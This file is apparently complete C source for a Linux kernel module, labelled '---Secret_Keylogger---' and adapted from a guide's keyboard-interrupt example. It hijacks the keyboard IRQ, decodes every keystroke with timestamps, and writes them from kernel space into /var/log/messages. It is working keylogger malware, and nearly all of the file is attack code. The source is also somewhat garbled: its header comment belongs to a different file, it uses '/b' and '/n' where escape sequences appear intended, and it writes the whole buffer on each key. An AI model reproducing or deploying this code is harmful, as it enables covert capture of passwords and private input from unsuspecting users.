/*  
 *  hello-1.c - The simplest kernel module.
 */
/*
* intrpt.c − An interrupt handler.
*
* Copyright (C) 2001 by Peter Jay Salzman
*/
/*
* The necessary header files
*/
/*
* Standard in kernel modules
*/
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/ktime.h>
#include <linux/time.h>
/* We're doing kernel work */
/* Specifically, a module */
/* We want an interrupt */

#define KB_IRQ 1
const char *NAME = "---Secret_Keylogger---";
const char *LOG_FILE = "/var/log/messages";
struct file* log_fp;
loff_t log_offset;
struct task_struct *logger;

/* Stores information for logging. As of now, only the scancode is needed */
struct logger_data{
	unsigned char scancode;
} ld;

/* =================================================================== */

/* Opens a file from kernel space. */
struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
	mm_segment_t old_fs;
	int error = 0;

	/* Save current process address limit. */
	old_fs = get_fs();
	/* Set current process address limit to that of the kernel, allowing
 	 * the system call to access kernel memory.
	 */ 
	set_fs(get_ds());
	fp = filp_open(path, flags, rights);
	/* Restore address limit to current process. */
	set_fs(old_fs);

	if(IS_ERR(fp)){
		/* Debugging... */
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}

	return fp;
}

/* Closes file handle. */
void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

/* Writes buffer to file from kernel space. */
int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
	mm_segment_t old_fs;
	int ret;

	old_fs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(fp, data, size, &log_offset);
	/* Increase file offset, preparing for next write operation. */
	log_offset += size;

	set_fs(old_fs);
	return ret;
}
#define MY_WORK_QUEUE_NAME "WQsched.c"
static struct workqueue_struct *my_workqueue;
/*
* This will get called by the kernel as soon as it's safe
* to do everything normally allowed by kernel modules.
*/
static void got_char(struct work_struct *work){
printk(KERN_INFO "Scan Code %x %s.\n",
((int) ld.scancode) & 0x7F,
(ld.scancode) & 0x80 ? "Released" : "Pressed");
static int shift = 0;
static int count=0,toggle=0;
char buf[80];
memset(buf,0,sizeof(buf));
if(count>78){
struct timespec tv;
struct tm res;
getnstimeofday(&tv);
time64_to_tm(tv.tv_sec,0,&res);
sprintf(buf,"\n%d %d-%d-%d] ",res.tm_mday,res.tm_hour,res.tm_min,res.tm_sec);
count=0;
}

switch(ld.scancode){
		
		default:return;
		case 1:strcpy(buf, "Bl");count=count+2;break;	
        case 2:strcpy(buf, (shift) ? "!" : "1");count=count+1;break;
        case 3:strcpy(buf, (shift) ? "@" : "2");count=count+1;break;
        case 4:strcpy(buf, (shift) ? "#" : "3");count=count+1; break;
		case 5:strcpy(buf, (shift) ? "$" : "4");count=count+1; break;
        case 6:strcpy(buf, (shift) ? "%" : "5");count=count+1; break;
        case 7:strcpy(buf, (shift) ? "^" : "6");count=count+1; break;
        case 8:strcpy(buf, (shift) ? "&" : "7");count=count+1; break;
        case 9:strcpy(buf, (shift) ? "*" : "8");count=count+1; break;
        case 12:strcpy(buf, (shift) ? "_" : "-");count=count+1; break;
        case 13:strcpy(buf, (shift) ? "+" : "=");count=count+1; break;
        case 16:strcpy(buf, (shift) ? "Q" : "q");count=count+1; break;
		case 17:strcpy(buf, (shift) ? "W" : "w");count=count+1; break;
        case 18:strcpy(buf, (shift) ? "E" : "e");count=count+1; break;
     	case 19:strcpy(buf, (shift) ? "R" : "r");count=count+1; break;
   		case 20:strcpy(buf, (shift) ? "T" : "t");count=count+1; break;
		case 21:strcpy(buf, (shift) ? "Y" : "y");count=count+1; break;
		case 22:strcpy(buf, (shift) ? "U" : "u");count=count+1; break;
      	case 23:strcpy(buf, (shift) ? "I" : "i");count=count+1; break;
		case 24:strcpy(buf, (shift) ? "O" : "o");count=count+1; break;
		case 25:strcpy(buf, (shift) ? "P" : "p"); count=count+1;break;		
		case 30:strcpy(buf, (shift) ? "A" : "a");count+=1; break;
		case 31:strcpy(buf, (shift) ? "S" : "s");count+=1; break;
        case 32:strcpy(buf, (shift) ? "D" : "d");count+=1; break;
        case 33:strcpy(buf, (shift) ? "F" : "f");count+=1; break;
	    case 34:strcpy(buf, (shift) ? "G" : "g");count+=1; break;
		case 35:strcpy(buf, (shift) ? "H" : "h");count+=1; break;
		case 36:strcpy(buf, (shift) ? "J" : "j");count+=1; break;
		case 37:strcpy(buf, (shift) ? "K" : "k");count+=1; break;
		case 38:strcpy(buf, (shift) ? "L" : "l");count+=1; break;
		case 44:strcpy(buf, (shift) ? "Z" : "z");count+=1; break;
		case 45:strcpy(buf, (shift) ? "X" : "x");count+=1; break;
		case 46:strcpy(buf, (shift) ? "C" : "c");count+=1; break;
		case 47:strcpy(buf, (shift) ? "V" : "v");count+=1; break;
		case 48:strcpy(buf, (shift) ? "B" : "b");count+=1; break;
		case 49:strcpy(buf, (shift) ? "N" : "n");count+=1; break;
		case 50:strcpy(buf, (shift) ? "M" : "m");count+=1; break;
		case 42:
		case 54:shift = 1; break;
		case 170:
		case 182:shift = 0; break;	
		case 14:strcpy(buf, "/b");count=count+2; break;
		case 15:strcpy(buf, "/t"); count=count+2; break;
		case 28:strcpy(buf, "/n");count+=2; break;
		case 56:strcpy(buf, "(R-ALT");count+=7; break;
	    case 57:strcpy(buf, " ");count+=1; break;
		case 83:strcpy(buf, "/d");count+=1; break;	
		
	}
	
  log_write(log_fp, buf, sizeof(buf));
  

}
/*
* This function services keyboard interrupts. It reads the relevant
* information from the keyboard and then puts the non time critical
* part into the work queue. This will be run when the kernel considers it safe.
*/
irq_handler_t irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
/*
* This variables are static because they need to be
* accessible (through pointers) to the bottom half routine.
*/
static int initialised = 0;

static struct work_struct task;
unsigned char status;
/*
* Read keyboard status
*/
status = inb(0x64);
ld.scancode = inb(0x60);
if (initialised == 0) {
INIT_WORK(&task, got_char);
initialised = 1;
} else {
	INIT_WORK(&task, got_char);
//schedule_work(&task);
}
queue_work(my_workqueue, &task);
return (irq_handler_t)IRQ_HANDLED;
}
/*
* Initialize the module − register the IRQ handler
*/
static int __init kbmodule1(void)
{

	struct timespec tv;
	struct tm res;
	getnstimeofday(&tv);
	time64_to_tm(tv.tv_sec,0,&res);
    char buf[60];
    memset(buf,0,sizeof(buf));
	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT, 0644);
	if(IS_ERR(log_fp)){
		printk(KERN_INFO "FAILED to open log file.\n");
		return 1;
	}
	else{
		/* Log file opened, print debug message. */
		printk(KERN_INFO "SUCCESSFULLY opened log file.\n");
		/* Write title to log file. */
		sprintf(buf,"\n%d %d-%d-%d ",res.tm_mday,res.tm_hour,res.tm_min,res.tm_sec);
		log_write(log_fp, buf, sizeof(buf));
		
	}

my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
/*
* Since the keyboard handler won't co−exist with another handler,
* such as us, we have to disable it (free its IRQ) before we do
* anything. Since we don't know where it is, there's no way to
* reinstate it later − so the computer will have to be rebooted
* when we're done.
*/
free_irq(1, NULL);
/*
* Request IRQ 1, the keyboard IRQ, to go to our irq_handler.
* SA_SHIRQ means we're willing to have othe handlers on this IRQ.
* SA_INTERRUPT can be used to make the handler into a fast interrupt.
*/
return request_irq(1,
/* The number of the keyboard IRQ on PCs */
(irq_handler_t)irq_handler, /* our handler */
IRQF_SHARED, "test_keyboard_irq_handler",
&ld);

}
/*
* Cleanup
*/
static void __exit kbmodule2(void)
{
/*
* This is only here for completeness. It's totally irrelevant, since
* we don't have a way to restore the normal keyboard interrupt so the
* computer is completely useless and has to be rebooted.
*/
free_irq(1, &ld);
if(log_fp != NULL){

		log_close(log_fp);
	}

}
/*
* some work_queue related functions are just available to GPL licensed Modules
*/
MODULE_LICENSE("GPL");
module_init(kbmodule1);
module_exit(kbmodule2);
